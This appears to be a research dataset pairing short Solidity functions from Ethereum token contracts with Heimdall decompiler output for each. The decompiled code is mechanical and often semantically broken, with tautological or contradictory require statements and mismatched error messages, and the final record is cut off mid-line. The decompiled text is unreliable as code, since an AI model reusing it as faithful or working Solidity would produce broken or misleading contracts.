{"contract_address": "0xB14c3a406A345F2b4E79aB45d81A63E9a815ec71", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(!(address(msg.sender) == 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0) == 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(arg1 == 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(tradingActive / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0xdead), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(arg0)) == 0xdead), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_b[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x1d;\n        require(bytes1(storage_map_b[var_a] / 0x01), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x1f;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(arg1 & (sellTotalFees > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x1f;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer amount exceeds balance\");\n        require(!(buyTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(0 > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(msg.sender) == 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(this) == 0), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_b[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x26;\n        var_h = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_i = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - 0;\n        var_a = address(this);\n        var_b = 0;\n        require(!(storage_map_b[var_a] > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] + 0;\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!(arg1 < 0), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(address(msg.sender) == 0), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(address(msg.sender) == 0), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(!(address(msg.sender) == 0), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x1f;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer from the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x1f;\n        require(!(bytes1(storage_map_b[var_a] / 0x01)), \"ERC20: transfer from the zero address\");\n        require(!(buyTotalFees > 0), \"ERC20: transfer from the zero address\");\n        require(!(0 > 0), \"ERC20: transfer from the zero address\");\n        require(!(arg1 < 0), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(address(msg.sender) == 0), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        if (!tradingActive / 0x010000) {\n            if (!tradingActive / 0x010000) {\n                if (!tradingActive / 0x010000) {\n                    if (!tradingActive / 0x010000) {\n                        if (!tradingActive / 0x010000) {\n                        }\n                    }\n                }\n            }\n        }\n        if (tradingActive / 0x0100) {\n            require(bytes1(tradingActive / 0x0100), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(bytes1(transferDelayEnabled / 0x01)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(!(address(arg0)) == (address(owner / 0x01))), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(!(address(arg0)) == 0x7a250d5630b4cf539739df2c5dacb4c659f2488d), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1f;\n            require(!(!(address(arg0)) == 0x7a250d5630b4cf539739df2c5dacb4c659f2488d), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1e;\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1f;\n            require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x1e;\n            require(!(bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x1e;\n            require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        }\n        require(!(arg1 > maxTransactionAmount), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x36;\n        var_h = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_i = 0x206d61785472616e73616374696f6e416d6f756e742e00000000000000000000;\n        if (!storage_map_b[var_a] / 0x01) {\n        }\n        require(!(arg1 > maxTransactionAmount), \"Buy transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x35;\n        var_h = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_i = 0x6d61785472616e73616374696f6e416d6f756e742e0000000000000000000000;\n        if (!storage_map_b[var_a] / 0x01) {\n        }\n        var_a = address(tx.origin);\n        var_b = 0x0d;\n        require(storage_map_b[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x49;\n        var_h = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_i = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_j = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        if (address(arg0) == (address(owner / 0x01))) {\n            if (address(arg0) == (address(owner / 0x01))) {\n            }\n        }\n        var_a = address(msg.sender);\n        var_b = 0x1d;\n        require(bytes1(storage_map_b[var_a] / 0x01), \"Trading is not active.\");\n        require(bytes1(storage_map_b[var_a] / 0x01), \"Trading is not active.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x16;\n        var_h = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (address(arg0) == 0) {\n            if (address(arg0) == 0) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x39f3C6C2a3E69D908DFE9863C9127080CC487933", "original_solidity_code": "function rescueETH(uint256 weiAmount) external onlyOwner {\r\n        payable(owner()).transfer(weiAmount);\r\n    }", "heimdall_decompiled_code": "function rescueETH(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        (bool success, bytes memory ret0) = address(owner).transfer(arg0);\n    }"}
{"contract_address": "0x0167A447Af23ec7E8c7aFE21a84b79A1E3679502", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x8D8695A3Da190f5D1C468FA7018a83F4FFb6c513", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x20C7b73Be0B1AD179Db94e5b0AC9aD86fa0f068c", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0D5bB4EE4e770C761F2F203c0828Eb2487A0Ab60", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].add(addedValue)\r\n        );\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > ~(arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5Bfdf57678baFB4eBB2c09279ac382397F3006b6", "original_solidity_code": "function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {\r\n_swapTokensAtAmount = swapTokensAtAmount;\r\n}", "heimdall_decompiled_code": "function setMinSwapTokensThreshold(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _swapTokensAtAmount = arg0;\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function set_New_Router_and_Make_Pair(address newRouter) public onlyOwner() {\r\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\r\n        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());\r\n        uniswapV2Router = _newPCSRouter;\r\n    }", "heimdall_decompiled_code": "function set_New_Router_and_Make_Pair(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(arg0).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (address(var_f)));\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(arg0).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (address(var_f)));\n        var_h = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_i = address(var_f);\n        (bool success, bytes memory ret0) = address(var_f).{ value: 0 ether }Unresolved_c9c65396(var_e); // call\n    }"}
{"contract_address": "0x122B0769A36fBe22EE9FF866fdF7012C9697569e", "original_solidity_code": "function enableTrading() external onlyOwner {\r\n        tradingActive = true;\r\n        swapEnabled = true;\r\n    }", "heimdall_decompiled_code": "function enableTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = (0x01 * 0x0100) | (uint248(tradingActive));\n        tradingActive = (0x01 * 0x010000) | (uint248(tradingActive));\n    }"}
{"contract_address": "0xfc606C8F7141110c3f295a22004D274680A9A029", "original_solidity_code": "function changeTokensPerEth(uint256 _tokens_per_eth) public onlyOwner {\r\n        TOKENS_PER_ETH = _tokens_per_eth;\r\n    }", "heimdall_decompiled_code": "function changeTokensPerEth(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        TOKENS_PER_ETH = arg0;\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function updateDevWallet(address newWallet) external onlyOwner {\\r\\n        devWallet = newWallet;\\r\\n    }", "heimdall_decompiled_code": "function updateDevWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_m = (address(arg0)) | (uint96(store_m));\n    }"}
{"contract_address": "0x3De5be19D4c2eA5F9c93E556383E286fe2101A96", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_d), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEC5Cd1764456f3CaBb72B90b95526BE632D8385c", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        \r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(!(address(msg.sender) == 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0) == 0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEA96F358096DB436A74f5C974F59fdE3Bc5185e7", "original_solidity_code": "function enableTrading() external onlyOwner {enabledTrading = true;}", "heimdall_decompiled_code": "function enableTrading() public {\n        require(msg.sender == (address(getOwner)), \"Ownable: Caller is not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x4f776e61626c653a2043616c6c6572206973206e6f74206f776e657200000000;\n        uniPairAddy = 0x010000000000000000000000000000000000000000 | (uint248(uniPairAddy));\n    }"}
{"contract_address": "0x8a357F1146a32d8a2494bCdaB62452ed3498196a", "original_solidity_code": "function reduceFee(uint256 _newFee) external{\n      require(_msgSender()==_taxWallet);\n      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);\n      _finalBuyTax=_newFee;\n      _finalSellTax=_newFee;\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0) public {\n        require(address(msg.sender) == (address(store_p)));\n        require(arg0 > store_e);\n        require(!arg0 > store_e);\n        store_e = arg0;\n        store_q = arg0;\n    }"}
{"contract_address": "0x700604d812AD038BB5fE00ddDB8c0375E65A307C", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x59f53b5298b50696aA8995dda90D6a0bB77dE394", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x649695aB734cF73FDD08262D5297F0f34368274C", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(address(msg.sender) == (address(store_d / 0x01)));\n        require(!(address(msg.sender)) == (address(store_e / 0x01)));\n        require(!0);\n        var_a = 0x3021ed1000000000000000000000000000000000000000000000000000000000;\n        address var_b = address(arg0);\n        uint256 var_c = arg1;\n        require(address(store_f / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_f / 0x01).{ value: 0 ether }Unresolved_3021ed10(var_b); // call\n        var_a = 0x315d82af00000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).validationActive(var_b); // staticcall\n        uint256 var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: transfer amount exceeds balance\");\n        require(var_e == (var_e), \"ERC20: transfer amount exceeds balance\");\n        require((var_e) - 0x01, \"ERC20: transfer amount exceeds balance\");\n        address var_f = address(msg.sender);\n        var_g = 0x04;\n        require(!(storage_map_g[var_f] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_h = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = ((0x04 + var_d) + 0x20) - (0x04 + var_d);\n        var_i = 0x26;\n        var_j = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_k = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_f = address(msg.sender);\n        var_g = 0x04;\n        storage_map_g[var_f] = 